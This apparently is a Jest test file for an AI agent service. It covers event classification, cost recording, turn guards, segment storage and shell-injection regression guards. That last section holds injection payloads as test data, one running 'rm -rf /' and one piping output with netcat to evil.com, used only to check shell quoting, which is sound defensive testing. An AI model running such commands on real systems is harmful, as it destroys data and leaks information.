        { event: EventType.TOOL_CALL_RESULT, data: { messageId: 'tc-1', toolCallId: 'tc-1', content: 'remote: Invalid username or token.', role: 'tool', isError: false } },
        { event: EventType.RUN_FINISHED, data: {} },
      ]);
      mockEventBridge = bridge;

      agentService = createAgentService();
      await agentService.runTurn({
        conversationId: 'conv-1',
        sandboxId: 'sb-1',
        message: 'test',
        userId: 'user-1',
      });

      const events = emitSpy.mock.calls.map((c) => c[1].event);
      expect(events).toContain('CREDENTIAL_FAILURE');
    });

    it('[P0] emits ACCESS_DENIED on the SSE channel when classifier returns AccessDeniedEvent', async () => {
      mockClassifier.classifyToolResult.mockResolvedValue({
        type: 'ACCESS_DENIED',
        toolCallId: 'tc-1',
        code: 'RATE_LIMITED',
      });

      const bridge = createMockEventBridge([
        { event: EventType.TOOL_CALL_START, data: { toolCallId: 'tc-1', toolCallName: 'Bash', parentMessageId: null } },
        { event: EventType.TOOL_CALL_END, data: { toolCallId: 'tc-1' } },
        { event: EventType.TOOL_CALL_RESULT, data: { messageId: 'tc-1', toolCallId: 'tc-1', content: 'Rate limit exceeded', role: 'tool', isError: false } },
        { event: EventType.RUN_FINISHED, data: {} },
      ]);
      mockEventBridge = bridge;

      agentService = createAgentService();
      await agentService.runTurn({
        conversationId: 'conv-1',
        sandboxId: 'sb-1',
        message: 'test',
        userId: 'user-1',
      });

      const events = emitSpy.mock.calls.map((c) => c[1].event);
      expect(events).toContain('ACCESS_DENIED');
    });

    it('[P0] CREDENTIAL_FAILURE is emitted before RUN_FINISHED (event ordering)', async () => {
      mockClassifier.classifyToolResult.mockResolvedValue({
        type: 'CREDENTIAL_FAILURE',
        toolCallId: 'tc-1',
      });

      const bridge = createMockEventBridge([
        { event: EventType.TOOL_CALL_START, data: { toolCallId: 'tc-1', toolCallName: 'Bash', parentMessageId: null } },
        { event: EventType.TOOL_CALL_END, data: { toolCallId: 'tc-1' } },
        { event: EventType.TOOL_CALL_RESULT, data: { messageId: 'tc-1', toolCallId: 'tc-1', content: 'remote: Invalid username or token.', role: 'tool', isError: false } },
        { event: EventType.RUN_FINISHED, data: {} },
      ]);
      mockEventBridge = bridge;

      agentService = createAgentService();
      await agentService.runTurn({
        conversationId: 'conv-1',
        sandboxId: 'sb-1',
        message: 'test',
        userId: 'user-1',
      });

      const events = emitSpy.mock.calls.map((c) => c[1].event);
      const credentialIndex = events.indexOf('CREDENTIAL_FAILURE');
      const finishedIndex = events.indexOf(EventType.RUN_FINISHED);

      expect(credentialIndex).toBeGreaterThan(-1);
      expect(finishedIndex).toBeGreaterThan(-1);
      expect(credentialIndex).toBeLessThan(finishedIndex);
    });

    it('[P1] classifier failure (throws) does not crash the agent run — RUN_FINISHED still emits, logger.error called', async () => {
      mockClassifier.classifyToolResult.mockRejectedValue(new Error('classifier crashed'));

      const bridge = createMockEventBridge([
        { event: EventType.TOOL_CALL_START, data: { toolCallId: 'tc-1', toolCallName: 'Bash', parentMessageId: null } },
        { event: EventType.TOOL_CALL_END, data: { toolCallId: 'tc-1' } },
        { event: EventType.TOOL_CALL_RESULT, data: { messageId: 'tc-1', toolCallId: 'tc-1', content: 'output', role: 'tool', isError: false } },
        { event: EventType.RUN_FINISHED, data: {} },
      ]);
      mockEventBridge = bridge;

      agentService = createAgentService();
      const errorSpy = jest.spyOn(agentService['logger'], 'error');

      await agentService.runTurn({
        conversationId: 'conv-1',
        sandboxId: 'sb-1',
        message: 'test',
        userId: 'user-1',
      });

      const finishedEvents = emitSpy.mock.calls.filter(
        (c) => c[1]?.event === EventType.RUN_FINISHED,
      );
      expect(finishedEvents).toHaveLength(1);
      expect(errorSpy).toHaveBeenCalledWith(
        expect.stringContaining('Classifier failed'),
      );
    });
  });

  // ─── Story 3.8: Cost recording from RUN_FINISHED data payload ────────

  describe('[P0] Story 3.8 AC-1 — cost recording from RUN_FINISHED data payload', () => {
    it('[P0] recordCost is called with correct cost data when RUN_FINISHED carries cost data', async () => {
      const bridge = createMockEventBridge([
        { event: EventType.TEXT_MESSAGE_CONTENT, data: { messageId: 'msg-1', delta: 'Hello' } },
        {
          event: EventType.RUN_FINISHED,
          data: { total_cost_usd: 0.42, session_id: 'sess-1', num_turns: 3, duration_ms: 5000 },
        },
      ]);
      mockEventBridge = bridge;

      agentService = createAgentService();
      await agentService.runTurn({
        conversationId: 'conv-1',
        sandboxId: 'sb-1',
        message: 'test',
        userId: 'user-1',
      });

      expect(mockCostTracking.recordCost).toHaveBeenCalledWith({
        userId: 'user-1',
        conversationId: 'conv-1',
        totalCostUsd: 0.42,
        sessionId: 'sess-1',
        numTurns: 3,
        durationMs: 5000,
      });
    });

    it('[P0] recordCost is NOT called when RUN_FINISHED has no cost data', async () => {
      const bridge = createMockEventBridge([
        { event: EventType.TEXT_MESSAGE_CONTENT, data: { messageId: 'msg-1', delta: 'Hello' } },
        { event: EventType.RUN_FINISHED, data: {} },
      ]);
      mockEventBridge = bridge;

      agentService = createAgentService();
      await agentService.runTurn({
        conversationId: 'conv-1',
        sandboxId: 'sb-1',
        message: 'test',
        userId: 'user-1',
      });

      expect(mockCostTracking.recordCost).not.toHaveBeenCalled();
    });

    it('[P0] recordCost failure does not crash the agent run — RUN_FINISHED still emits', async () => {
      mockCostTracking.recordCost.mockRejectedValue(new Error('cost DB write failed'));

      const bridge = createMockEventBridge([
        { event: EventType.TEXT_MESSAGE_CONTENT, data: { messageId: 'msg-1', delta: 'Hello' } },
        {
          event: EventType.RUN_FINISHED,
          data: { total_cost_usd: 0.42, session_id: 'sess-1', num_turns: 3, duration_ms: 5000 },
        },
      ]);
      mockEventBridge = bridge;

      agentService = createAgentService();
      const loggerErrorSpy = jest.spyOn(agentService['logger'], 'error').mockImplementation(() => undefined);
      await agentService.runTurn({
        conversationId: 'conv-1',
        sandboxId: 'sb-1',
        message: 'test',
        userId: 'user-1',
      });

      const finishedEvents = emitSpy.mock.calls.filter(
        (c) => c[1]?.event === EventType.RUN_FINISHED,
      );
      expect(finishedEvents).toHaveLength(1);
      expect(loggerErrorSpy).toHaveBeenCalledWith(
        expect.stringContaining('Failed to record cost for conversation conv-1'),
      );
      loggerErrorSpy.mockRestore();
    });

    it('[P1] cost is recorded when the result message arrives after tool calls', async () => {
      const bridge = createMockEventBridge([
        { event: EventType.TOOL_CALL_START, data: { toolCallId: 'tc-1', toolCallName: 'Bash', parentMessageId: null } },
        { event: EventType.TOOL_CALL_END, data: { toolCallId: 'tc-1' } },
        { event: EventType.TOOL_CALL_RESULT, data: { messageId: 'tc-1', toolCallId: 'tc-1', content: 'done', role: 'tool', isError: false } },
        {
          event: EventType.RUN_FINISHED,
          data: { total_cost_usd: 0.77, session_id: 'sess-1', num_turns: 3, duration_ms: 5000 },
        },
      ]);
      mockEventBridge = bridge;

      agentService = createAgentService();
      await agentService.runTurn({
        conversationId: 'conv-1',
        sandboxId: 'sb-1',
        message: 'test',
        userId: 'user-1',
      });

      expect(mockCostTracking.recordCost).toHaveBeenCalledWith({
        userId: 'user-1',
        conversationId: 'conv-1',
        totalCostUsd: 0.77,
        sessionId: 'sess-1',
        numTurns: 3,
        durationMs: 5000,
      });
    });
  });

  // ─── Story 3.11: Concurrent-turn guard ────────────────────────────────

  describe('[P0] Story 3.11 — concurrent-turn guard (AC: 3)', () => {
    it('[P0] second runTurn on an in-flight conversationId is rejected (returns without overwriting)', async () => {
      const bridge = createMockEventBridge([]);
      bridge.streamAgentEvents.mockImplementationOnce(
        async () => new Promise<void>(() => undefined),
      );
      mockEventBridge = bridge;

      agentService = createAgentService();
      const firstRun = agentService.runTurn({
        conversationId: 'conv-1',
        sandboxId: 'sb-1',
        message: 'first',
        userId: 'user-1',
      });
      firstRun.catch(() => undefined);
      await jest.advanceTimersByTimeAsync(0);

      await expect(agentService.runTurn({
        conversationId: 'conv-1',
        sandboxId: 'sb-1',
        message: 'second',
        userId: 'user-1',
      })).resolves.toBeUndefined();

      expect(agentService.isIdle('conv-1')).toBe(false);
    });

    it('[P0] the rejected second turn does NOT emit RUN_STARTED or RUN_ERROR', async () => {
      const bridge = createMockEventBridge([]);
      bridge.streamAgentEvents.mockImplementationOnce(
        async () => new Promise<void>(() => undefined),
      );
      mockEventBridge = bridge;

      agentService = createAgentService();
      const firstRun = agentService.runTurn({
        conversationId: 'conv-1',
        sandboxId: 'sb-1',
        message: 'first',
        userId: 'user-1',
      });
      firstRun.catch(() => undefined);
      await jest.advanceTimersByTimeAsync(0);

      emitSpy.mockClear();
      await agentService.runTurn({
        conversationId: 'conv-1',
        sandboxId: 'sb-1',
        message: 'second',
        userId: 'user-1',
      });

      const emittedEvents = emitSpy.mock.calls.map((c) => c[1]?.event);
      expect(emittedEvents).not.toContain(EventType.RUN_STARTED);
      expect(emittedEvents).not.toContain(EventType.RUN_ERROR);
    });
  });

  // ─── Story 5.5: Segments persistence ─────────────────────────────────

  describe('[P0] Story 5.5 — segments persistence', () => {
    it('[P0] persists segments alongside content in Turn row', async () => {
      const bridge = createMockEventBridge([
        { event: EventType.TEXT_MESSAGE_CONTENT, data: { messageId: 'msg-1', delta: 'Let me check.' } },
        { event: EventType.TOOL_CALL_START, data: { toolCallId: 'tc-1', toolCallName: 'Bash', parentMessageId: null } },
        { event: EventType.TOOL_CALL_ARGS, data: { toolCallId: 'tc-1', delta: '{"command":"git status"}' } },
        { event: EventType.TOOL_CALL_END, data: { toolCallId: 'tc-1' } },
        { event: EventType.TOOL_CALL_RESULT, data: { messageId: 'tc-1', toolCallId: 'tc-1', content: 'nothing to commit', role: 'tool', isError: false } },
        { event: EventType.TEXT_MESSAGE_CONTENT, data: { messageId: 'msg-1', delta: 'Done.' } },
        { event: EventType.RUN_FINISHED, data: {} },
      ]);
      mockEventBridge = bridge;

      agentService = createAgentService();
      await agentService.runTurn({
        conversationId: 'conv-1',
        sandboxId: 'sb-1',
        message: 'test',
        userId: 'user-1',
      });

      const assistantTurnCall = mockPrisma.turn.create.mock.calls.find(
        // eslint-disable-next-line @typescript-eslint/no-explicit-any
        (call: any[]) => call[0]?.data?.role === 'assistant',
      );

      expect(assistantTurnCall).toBeDefined();
      expect(assistantTurnCall[0].data.content).toContain('Let me check.');
      expect(assistantTurnCall[0].data.content).toContain('Done.');
      expect(assistantTurnCall[0].data).toHaveProperty('segments');
      expect(Array.isArray(assistantTurnCall[0].data.segments)).toBe(true);
    });

    it('[P0] segments array contains text and tool_call segments in order', async () => {
      const bridge = createMockEventBridge([
        { event: EventType.TEXT_MESSAGE_CONTENT, data: { messageId: 'msg-1', delta: 'Before tool.' } },
        { event: EventType.TOOL_CALL_START, data: { toolCallId: 'tc-1', toolCallName: 'Bash', parentMessageId: null } },
        { event: EventType.TOOL_CALL_ARGS, data: { toolCallId: 'tc-1', delta: '{"command":"ls"}' } },
        { event: EventType.TOOL_CALL_END, data: { toolCallId: 'tc-1' } },
        { event: EventType.TOOL_CALL_RESULT, data: { messageId: 'tc-1', toolCallId: 'tc-1', content: 'file.txt', role: 'tool', isError: false } },
        { event: EventType.TEXT_MESSAGE_CONTENT, data: { messageId: 'msg-1', delta: 'After tool.' } },
        { event: EventType.RUN_FINISHED, data: {} },
      ]);
      mockEventBridge = bridge;

      agentService = createAgentService();
      await agentService.runTurn({
        conversationId: 'conv-1',
        sandboxId: 'sb-1',
        message: 'test',
        userId: 'user-1',
      });

      const assistantTurnCall = mockPrisma.turn.create.mock.calls.find(
        // eslint-disable-next-line @typescript-eslint/no-explicit-any
        (call: any[]) => call[0]?.data?.role === 'assistant',
      );

      expect(assistantTurnCall).toBeDefined();
      const segments = assistantTurnCall[0].data.segments;
      expect(segments.length).toBeGreaterThanOrEqual(3);

      const segmentTypes = segments.map((s: { type: string }) => s.type);
      expect(segmentTypes).toContain('text');
      expect(segmentTypes).toContain('tool_call');

      const firstToolCallIdx = segmentTypes.indexOf('tool_call');
      expect(segmentTypes[firstToolCallIdx - 1]).toBe('text');
      expect(segmentTypes[firstToolCallIdx + 1]).toBe('text');
    });

    it('[P0] tool_call segment captures toolCallId, toolName, and status', async () => {
      const bridge = createMockEventBridge([
        { event: EventType.TOOL_CALL_START, data: { toolCallId: 'tc-1', toolCallName: 'Bash', parentMessageId: null } },
        { event: EventType.TOOL_CALL_ARGS, data: { toolCallId: 'tc-1', delta: '{"command":"git status"}' } },
        { event: EventType.TOOL_CALL_END, data: { toolCallId: 'tc-1' } },
        { event: EventType.TOOL_CALL_RESULT, data: { messageId: 'tc-1', toolCallId: 'tc-1', content: 'nothing to commit', role: 'tool', isError: false } },
        { event: EventType.RUN_FINISHED, data: {} },
      ]);
      mockEventBridge = bridge;

      agentService = createAgentService();
      await agentService.runTurn({
        conversationId: 'conv-1',
        sandboxId: 'sb-1',
        message: 'test',
        userId: 'user-1',
      });

      const assistantTurnCall = mockPrisma.turn.create.mock.calls.find(
        // eslint-disable-next-line @typescript-eslint/no-explicit-any
        (call: any[]) => call[0]?.data?.role === 'assistant',
      );

      expect(assistantTurnCall).toBeDefined();
      const segments = assistantTurnCall[0].data.segments;
      const toolCallSegment = segments.find(
        (s: { type: string }) => s.type === 'tool_call',
      );

      expect(toolCallSegment).toBeDefined();
      expect(toolCallSegment.toolCall).toHaveProperty('toolCallId', 'tc-1');
      expect(toolCallSegment.toolCall).toHaveProperty('toolName', 'Bash');
      expect(toolCallSegment.toolCall.status).toBe('completed');
    });
  });

  // ─── Story 6.3: stop() and onModuleDestroy() delegate to AguiEventBridgeService ──

  describe('[P0] Story 6.3 — stop() and onModuleDestroy() delegate to AguiEventBridgeService (AC-3, AC-6)', () => {
    it('[P0] stop() calls aguiEventBridgeService.stop(conversationId) (AC-3)', async () => {
      const bridge = createControllableEventBridge();
      mockEventBridge = bridge;

      agentService = createAgentService();
      const runTurnPromise = agentService.runTurn({
        conversationId: 'conv-1',
        sandboxId: 'sb-1',
        message: 'test',
        userId: 'user-1',
      });
      runTurnPromise.catch(() => undefined);
      await jest.advanceTimersByTimeAsync(0);

      await agentService.stop('conv-1');

      expect(bridge.stop).toHaveBeenCalledWith('conv-1');
      // The controllable bridge's stop() rejects the stream with AGENT_STOPPED —
      // runTurn's catch fires (skips RUN_ERROR) and finally cleans up. Await
      // it so no never-resolving promise is left dangling.
      await runTurnPromise;
    });

    it('[P0] stop() emits RUN_FINISHED after aguiEventBridgeService.stop() (AC-3)', async () => {
      const bridge = createControllableEventBridge();
      mockEventBridge = bridge;

      agentService = createAgentService();
      const runTurnPromise = agentService.runTurn({
        conversationId: 'conv-1',
        sandboxId: 'sb-1',
        message: 'test',
        userId: 'user-1',
      });
      runTurnPromise.catch(() => undefined);
      await jest.advanceTimersByTimeAsync(0);

      emitSpy.mockClear();
      await agentService.stop('conv-1');

      const finishedCalls = emitSpy.mock.calls.filter(
        (c) => c[1]?.event === EventType.RUN_FINISHED,
      );
      // Exactly one RUN_FINISHED (from stop()); runTurn's catch skips it for
      // AGENT_STOPPED — no double emission.
      expect(finishedCalls).toHaveLength(1);
      await runTurnPromise;
    });

    it('[P0] onModuleDestroy() calls aguiEventBridgeService.stop() for each active run (AC-6)', async () => {
      const bridge = createControllableEventBridge();
      mockEventBridge = bridge;

      agentService = createAgentService();
      const run1 = agentService.runTurn({
        conversationId: 'conv-1',
        sandboxId: 'sb-1',
        message: 'first',
        userId: 'user-1',
      });
      const run2 = agentService.runTurn({
        conversationId: 'conv-2',
        sandboxId: 'sb-2',
        message: 'second',
        userId: 'user-2',
      });
      run1.catch(() => undefined);
      run2.catch(() => undefined);
      await jest.advanceTimersByTimeAsync(0);

      agentService.onModuleDestroy();

      expect(bridge.stop).toHaveBeenCalledWith('conv-1');
      expect(bridge.stop).toHaveBeenCalledWith('conv-2');
      // Settle the in-flight runs (onModuleDestroy fire-and-forgets bridge.stop()
      // which rejects the streams with AGENT_STOPPED).
      await run1;
      await run2;
    });
  });

  // ─── Story 6.3 AC-2: Regression guards — credential-isolation + input-injection ──

  describe('[P0] Story 6.3 AC-2 — Regression guards: credential-isolation + input-injection for command construction', () => {
    function captureCommand(): {
      bridge: { streamAgentEvents: jest.Mock; stop: jest.Mock };
      getCommand: () => string;
    } {
      let capturedCommand = '';
      const bridge = {
        streamAgentEvents: jest.fn(async (params: { command?: string }) => {
          capturedCommand = params.command ?? '';
        }),
        stop: jest.fn().mockResolvedValue(undefined),
      };
      return { bridge, getCommand: () => capturedCommand };
    }

    it('[P0] command passed to streamAgentEvents does NOT contain platform credentials', async () => {
      const { bridge, getCommand } = captureCommand();
      mockEventBridge = bridge;
      agentService = createAgentService();
      await agentService.runTurn({
        conversationId: 'conv-1',
        sandboxId: 'sb-1',
        message: 'test',
        userId: 'user-1',
      });

      const command = getCommand();
      expect(command).not.toContain('DATABASE_URL');
      expect(command).not.toContain('AUTH_SECRET');
      expect(command).not.toContain('DAYTONA_API_KEY');
      expect(command).not.toContain('DAYTONA_API_URL');
      expect(command).not.toContain('CREDENTIAL_ENCRYPTION_KEK');
    });

    it('[P0] ANTHROPIC_API_KEY and GITHUB_TOKEN are NOT interpolated into the command (injected via sandbox env only)', async () => {
      process.env.ANTHROPIC_API_KEY = 'sk-ant-test-key';
      try {
        const { bridge, getCommand } = captureCommand();
        mockEventBridge = bridge;
        agentService = createAgentService();
        await agentService.runTurn({
          conversationId: 'conv-1',
          sandboxId: 'sb-1',
          message: 'test',
          userId: 'user-1',
        });

        const command = getCommand();
        expect(command).not.toContain('sk-ant-test-key');
        expect(command).not.toContain('ANTHROPIC_API_KEY');
        expect(command).not.toContain('GITHUB_TOKEN');
      } finally {
        delete process.env.ANTHROPIC_API_KEY;
      }
    });

    it('[P0] malicious user message cannot inject additional shell commands into the sandbox-agent command', async () => {
      const { bridge, getCommand } = captureCommand();
      mockEventBridge = bridge;
      agentService = createAgentService();
      const maliciousMessage = 'hello"; rm -rf / #';
      await agentService.runTurn({
        conversationId: 'conv-1',
        sandboxId: 'sb-1',
        message: maliciousMessage,
        userId: 'user-1',
      });

      const command = getCommand();
      // The malicious payload must be safely shell-quoted — the entire message
      // is wrapped in single quotes so the shell treats it as a literal string
      // argument to --prompt. If the message were unquoted, the `;` would
      // terminate the --prompt argument and `rm -rf /` would execute as a
      // separate command.
      expect(command).toContain("'hello\"; rm -rf / #'");
    });

    it('[P0] user message with shell metacharacters is safely quoted in the command', async () => {
      const { bridge, getCommand } = captureCommand();
      mockEventBridge = bridge;
      agentService = createAgentService();
      await agentService.runTurn({
        conversationId: 'conv-1',
        sandboxId: 'sb-1',
        message: 'echo $(whoami) | nc evil.com 4444',
        userId: 'user-1',
      });

      const command = getCommand();
      // The subshell injection must not execute — the entire message is
      // single-quoted so $(whoami) and the pipe are literal strings. If the
      // message were unquoted, the pipe would chain `nc evil.com` as a
      // separate command.
      expect(command).toContain("'echo $(whoami) | nc evil.com 4444'");
    });
  });

  // ─── Story 6.3 AC-4: Host-based SDK code removed ─────────────────────

  describe('[P0] Story 6.3 AC-4 — Host-based SDK code removed', () => {
    it('[P0] AgentService no longer imports query/Query/SDKMessage from @anthropic-ai/claude-agent-sdk', async () => {
      // After the migration, agent.service.ts must not import from
      // @anthropic-ai/claude-agent-sdk. The module is mocked in jest config
      // (moduleNameMapper), so we verify the source file does not reference it.
      // eslint-disable-next-line @typescript-eslint/no-var-requires
      const fs = require('fs');
      // eslint-disable-next-line @typescript-eslint/no-var-requires
      const path = require('path');
      const source = fs.readFileSync(
        path.resolve(__dirname, 'agent.service.ts'),
        'utf-8',
      );
      expect(source).not.toContain('@anthropic-ai/claude-agent-sdk');
      expect(source).not.toContain('from \'os\'');
      expect(source).not.toContain('tmpdir');
      expect(source).not.toContain('AGENT_WORKDIR');
    });
  });
});
